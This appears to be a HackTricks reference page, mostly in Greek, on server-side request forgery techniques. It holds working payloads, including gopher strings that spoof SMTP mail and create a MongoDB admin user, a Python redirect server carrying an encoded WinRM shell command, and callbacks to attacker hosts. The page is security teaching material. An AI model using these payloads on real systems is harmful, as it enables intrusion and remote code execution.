# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Μια ευπάθεια **Server-side Request Forgery (SSRF)** εμφανίζεται όταν ένας attacker χειραγωγεί μια **server-side application** ώστε να πραγματοποιήσει **HTTP requests** προς ένα domain της επιλογής του. Αυτή η ευπάθεια εκθέτει τον server σε αυθαίρετα εξωτερικά requests που κατευθύνονται από τον attacker.

## Καταγραφή SSRF

Το πρώτο που πρέπει να κάνετε είναι να καταγράψετε μια SSRF αλληλεπίδραση που έχετε δημιουργήσει εσείς. Για να καταγράψετε μια HTTP ή DNS αλληλεπίδραση μπορείτε να χρησιμοποιήσετε εργαλεία όπως:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Παράκαμψη Whitelisted Domains

Συνήθως θα διαπιστώσετε ότι το SSRF λειτουργεί μόνο σε **ορισμένα whitelisted domains** ή URL. Στην επόμενη σελίδα υπάρχει μια **συλλογή τεχνικών για την παράκαμψη αυτής της whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

If the server is correctly protected you could **bypass all the restrictions by exploiting an Open Redirect inside the web page**. Because the webpage will allow **SSRF to the same domain** and probably will **follow redirects**, you can exploit the **Open Redirect to make the server to access internal any resource**.\
Διαβάστε περισσότερα εδώ: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Πρωτόκολλα

- **file://**
- Το URL scheme `file://` αναφέρεται, δείχνοντας απευθείας στο `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Το DICT URL scheme περιγράφεται ως μέσο πρόσβασης σε ορισμούς ή λίστες λέξεων μέσω του DICT protocol. Το παράδειγμα δείχνει ένα κατασκευασμένο URL που στοχεύει σε συγκεκριμένη λέξη, database και αριθμό εγγραφής, καθώς και ένα παράδειγμα όπου ένα PHP script μπορεί να καταχρηστεί για να συνδεθεί σε DICT server με credentials που παρέχει ο attacker: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Αναφέρεται ως πρωτόκολλο για secure file transfer πάνω από secure shell. Παράδειγμα δείχνει πώς ένα PHP script μπορεί να εκμεταλλευτεί για σύνδεση σε κακόβουλο SFTP server: `url=sftp://generic.com:11111/`
- **TFTP://**
- Το Trivial File Transfer Protocol, που λειτουργεί πάνω από UDP, αναφέρεται με παράδειγμα ενός PHP script που στέλνει αίτημα σε TFTP server. Ένα TFTP αίτημα γίνεται στο 'generic.com' στην πόρτα '12346' για το αρχείο 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Αυτό το τμήμα καλύπτει το Lightweight Directory Access Protocol, τονίζοντας τη χρήση του για τη διαχείριση και πρόσβαση σε κατανεμημένες υπηρεσίες directory information μέσω δικτύων IP. Αλληλεπιδράστε με ένα LDAP server στο localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Περιγράφεται μια μέθοδος εκμετάλλευσης SSRF για αλληλεπίδραση με SMTP υπηρεσίες στο localhost, συμπεριλαμβάνοντας βήματα για την αποκάλυψη εσωτερικών domain names και περαιτέρω ερευνητικές ενέργειες βάσει αυτών των πληροφοριών.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Εάν το SSRF εκτελείται από **curl**, το curl έχει μια δυνατότητα που ονομάζεται [**URL globbing**](https://everything.curl.dev/cmdline/globbing) που θα μπορούσε να είναι χρήσιμη για να παρακάμψει WAFs. Για παράδειγμα, σε αυτό το [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) θα βρείτε αυτό το παράδειγμα για ένα **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Η δυνατότητα του πρωτοκόλλου Gopher να ορίζει **IP, port and bytes** για επικοινωνία με servers συζητιέται, μαζί με εργαλεία όπως το [Gopherus](https://github.com/tarunkant/Gopherus) και το [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) για τη δημιουργία payloads. Δείχνονται δύο ξεχωριστές χρήσεις:

### Gopher://

Χρησιμοποιώντας αυτό το πρωτόκολλο μπορείτε να καθορίσετε τα **IP, port and bytes** που θέλετε ο server να **στείλει**. Στη συνέχεια, ουσιαστικά μπορείτε να εκμεταλλευτείτε ένα SSRF για να **επικοινωνήσετε με οποιονδήποτε TCP server** (αλλά πρέπει πρώτα να ξέρετε πώς να μιλήσετε στην υπηρεσία).\
Ευτυχώς, μπορείτε να χρησιμοποιήσετε το [Gopherus](https://github.com/tarunkant/Gopherus) για να δημιουργήσετε payloads για διάφορες υπηρεσίες. Επιπλέον, το [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) μπορεί να χρησιμοποιηθεί για να δημιουργήσει _gopher_ payloads για _Java RMI_ υπηρεσίες.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Δημιουργία χρήστη με username=admin και password=admin123 και με δικαιώματα=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF μέσω Referrer header & Άλλα

Το λογισμικό ανάλυσης σε διακομιστές συχνά καταγράφει το Referrer header για να παρακολουθεί τους εισερχόμενους συνδέσμους, μια πρακτική που ακούσια εκθέτει τις εφαρμογές σε ευπάθειες Server-Side Request Forgery (SSRF). Αυτό συμβαίνει επειδή τέτοιο λογισμικό μπορεί να επισκέπτεται εξωτερικά URLs που αναφέρονται στο Referrer header για να αναλύσει το περιεχόμενο του παραπέμποντος ιστότοπου. Για να αποκαλυφθούν αυτές οι ευπάθειες, προτείνεται το Burp Suite plugin "**Collaborator Everywhere**", αξιοποιώντας τον τρόπο με τον οποίο τα εργαλεία ανάλυσης επεξεργάζονται το Referer header για να εντοπίσουν πιθανά SSRF attack surfaces.

## SSRF μέσω δεδομένων SNI από πιστοποιητικό

Μια λανθασμένη διαμόρφωση που θα μπορούσε να επιτρέψει τη σύνδεση σε οποιοδήποτε backend μέσω μιας απλής ρύθμισης απεικονίζεται με ένα παράδειγμα διαμόρφωσης Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Σε αυτήν τη διαμόρφωση, η τιμή από το πεδίο Server Name Indication (SNI) χρησιμοποιείται άμεσα ως η διεύθυνση του backend. Αυτή η ρύθμιση εκθέτει μια ευπάθεια σε Server-Side Request Forgery (SSRF), η οποία μπορεί να αξιοποιηθεί απλά καθορίζοντας τη ζητούμενη διεύθυνση IP ή το όνομα domain στο πεδίο SNI. Ένα παράδειγμα εκμετάλλευσης για να αναγκάσετε μια σύνδεση σε ένα αυθαίρετο backend, όπως `internal.host.com`, χρησιμοποιώντας την εντολή `openssl` δίδεται παρακάτω:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF μέσω TLS AIA CA Issuers (Java mTLS)

Κάποιες υλοποιήσεις TLS θα κατεβάζουν αυτόματα τα ελλείποντα ενδιάμεσα CA χρησιμοποιώντας το **Authority Information Access (AIA) → CA Issuers** URI μέσα στο peer certificate. Στο **Java**, η ενεργοποίηση του `-Dcom.sun.security.enableAIAcaIssuers=true` κατά την εκτέλεση μιας υπηρεσίας mTLS αναγκάζει τον server να ακολουθήσει attacker-controlled URIs από το client certificate **κατά τη διάρκεια του handshake**, πριν εκτελεστεί οποιαδήποτε HTTP λογική.

- **Απαιτήσεις**: mTLS ενεργοποιημένο, Java AIA fetching ενεργοποιημένο, ο επιτιθέμενος μπορεί να παρουσιάσει ένα client cert με crafted AIA CA Issuers URI.
- **Πρόκληση SSRF** (παράδειγμα Java 21):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Το Java certpath debug output δείχνει `CertStore URI:http://localhost:8080`, και το `nc` καταγράφει το HTTP request με τον ελεγχόμενο `User-Agent` από `-Dhttp.agent`, αποδεικνύοντας SSRF κατά την επικύρωση του certificate.
- **DoS via file://**: η ρύθμιση του AIA CA Issuers στο `file:///dev/urandom` σε συστήματα τύπου Unix κάνει την Java να το αντιμετωπίσει ως CertStore και να διαβάζει απεριόριστα τυχαία bytes, κρατώντας έναν πυρήνα CPU απασχολημένο και μπλοκάροντας επακόλουθες συνδέσεις ακόμα και μετά την αποσύνδεση του client.

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF με Command Injection

Αξίζει να δοκιμάσετε ένα payload όπως: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Απόδοση PDF

Αν η σελίδα δημιουργεί αυτόματα ένα PDF με πληροφορίες που έχετε παράσχει, μπορείτε να εισάγετε λίγο JS που θα εκτελεστεί από τον PDF creator ο ίδιος (τον server) κατά τη δημιουργία του PDF και θα μπορείτε να εκμεταλλευτείτε SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Από SSRF σε DoS

Δημιουργήστε πολλές συνεδρίες και δοκιμάστε να κατεβάσετε μεγάλα αρχεία εκμεταλλευόμενοι το SSRF από τις συνεδρίες.

## SSRF PHP Functions

Δείτε την παρακάτω σελίδα για ευάλωτες PHP και ακόμη και Wordpress functions:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Για κάποιες εκμεταλλεύσεις μπορεί να χρειαστεί να στείλετε μια redirect response (πιθανώς για να χρησιμοποιήσετε ένα διαφορετικό πρωτόκολλο όπως το gopher). Εδώ έχετε διάφορους python κώδικες για να απαντήσετε με redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Κακώς ρυθμισμένοι proxies που οδηγούν σε SSRF

Κόλπα [**από αυτήν την ανάρτηση**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy vulnerable code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask επιτρέπει τη χρήση **`@`** ως αρχικού χαρακτήρα, κάτι που επιτρέπει να γίνει το **initial host name the username** και να inject-αριστεί ένας νέος. Αίτημα επίθεσης:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Ευάλωτος κώδικας:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Διαπιστώθηκε ότι είναι δυνατό να **start the path** ενός αιτήματος με τον χαρακτήρα **`;`**, ο οποίος επιτρέπει στη συνέχεια τη χρήση του **`@`** και την εισαγωγή ενός νέου host για πρόσβαση. Αίτημα επίθεσης:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Ενσωματωμένος Web Server του PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Ευάλωτος κώδικας PHP</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
Το PHP επιτρέπει τη χρήση του **χαρακτήρα `*` πριν από ένα slash στο path** του URL, ωστόσο έχει άλλους περιορισμούς, όπως ότι μπορεί να χρησιμοποιηθεί μόνο για το root pathname `/` και ότι οι τελείες `.` δεν επιτρέπονται πριν από το πρώτο slash, οπότε χρειάζεται να χρησιμοποιηθεί, για παράδειγμα, μια dotless-hex encoded IP address:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Αν έχετε **problems** στο να **exfiltrate content from a local IP** λόγω **CORS/SOP**, **DNS Rebidding** μπορεί να χρησιμοποιηθεί για να παρακάμψει αυτόν τον περιορισμό:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) is a tool to perform [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks. Περιλαμβάνει τα απαραίτητα components για να rebind την IP διεύθυνση του attack server DNS name στην IP διεύθυνση του target machine και για να σερβίρει attack payloads ώστε να εκμεταλλευτεί ευάλωτο λογισμικό στο target machine.

Δείτε επίσης τον **publicly running server in** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Απαιτήσεις:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Επίθεση:

1. Ζητήστε από τον **user/bot** να **access** ένα **domain** ελεγχόμενο από τον **attacker**
2. Το **TTL** του **DNS** είναι **0** sec (έτσι το victim θα ελέγξει ξανά την IP του domain σύντομα)
3. Μια **TLS connection** δημιουργείται μεταξύ του victim και του domain του **attacker**. Ο **attacker** εισάγει το **payload inside** το **Session ID or Session Ticket**.
4. Το **domain** θα ξεκινήσει ένα **infinite loop** ανακατευθύνσεων εναντίον **himself**. Ο στόχος αυτού είναι να κάνει τον **user/bot** να προσπελάσει το domain μέχρι να εκτελέσει **again** ένα **DNS request** για το domain.
5. Στο DNS request δίνεται **now** μια **private IP** διεύθυνση (127.0.0.1 για παράδειγμα)
6. Ο **user/bot** θα προσπαθήσει να **reestablish the TLS connection** και για να το κάνει αυτό θα **send** το **Session** ID/Ticket ID (όπου περιέχονταν το **payload** του **attacker**). Συγχαρητήρια — καταφέρατε να ζητήσετε από τον **user/bot** να attack himself.

Σημειώστε ότι κατά τη διάρκεια αυτής της επίθεσης, αν θέλετε να επιτεθείτε σε localhost:11211 (_memcache_) πρέπει να κάνετε το θύμα να δημιουργήσει την αρχική σύνδεση με www.attacker.com:11211 (η **port must always be the same**).\
Για να **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Για **περισσότερες πληροφορίες** δείτε την ομιλία όπου επεξηγείται αυτή η επίθεση: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Η διαφορά μεταξύ ενός blind **SSRF** και ενός μη-blind είναι ότι στο blind δεν μπορείτε να δείτε την απάντηση του **SSRF request**. Επομένως είναι πιο δύσκολο να εκμεταλλευτείτε γιατί θα μπορείτε να εκμεταλλευτείτε μόνο καλά-γνωστές ευπάθειες.

### Time based SSRF

**Έλεγχος του χρόνου** των αποκρίσεων από τον server μπορεί να είναι **δυνατό να γνωρίζετε αν ένας πόρος υπάρχει ή όχι** (ίσως χρειάζεται περισσότερο χρόνο για πρόσβαση σε έναν υπάρχοντα πόρο απ’ ό,τι σε έναν που δεν υπάρχει)

### From blid to full abusing status codes

Σύμφωνα με αυτό το [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), κάποια blind **SSRF** μπορεί να συμβούν επειδή ακόμη και αν το targeted URL απαντά με 200 status code (όπως AWS metadata), αυτά τα δεδομένα δεν είναι σωστά μορφοποιημένα και επομένως η εφαρμογή μπορεί να αρνηθεί να τα εμφανίσει.

Ωστόσο, βρέθηκε ότι αποστέλλοντας κάποιες responses ανακατευθύνσεων από 305 έως 309 στο **SSRF** μπορεί να γίνει δυνατό να κάνετε την εφαρμογή να ακολουθήσει αυτές τις ανακατευθύνσεις ενώ εισέρχεται σε κατάσταση σφάλματος που δεν ελέγχει πλέον τη μορφή των δεδομένων και μπορεί απλώς να τα εμφανίσει.

Ο python server που χρησιμοποιείται για να εκμεταλλευτεί αυτό είναι ο ακόλουθος:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Βήματα:**
- Πρώτο 302 κάνει την εφαρμογή να αρχίσει να ακολουθεί.
- Στη συνέχεια λαμβάνει 305 → 306 → 307 → 308 → 309 → 310.
- Μετά τον 5ο περίεργο κωδικό το PoC τελικά επιστρέφει 302 → 169.254.169.254 → 200 OK.

**Τι συμβαίνει μέσα στο στόχο:**
- libcurl από μόνο του ακολουθεί 305–310· απλώς κανονικοποιεί άγνωστους κωδικούς σε “follow.”
- Μετά από N περίεργες ανακατευθύνσεις (≥ 5 εδώ) ο wrapper της εφαρμογής αποφασίζει «κάτι δεν πάει καλά» και αλλάζει σε λειτουργία σφάλματος προοριζόμενη για debugging.
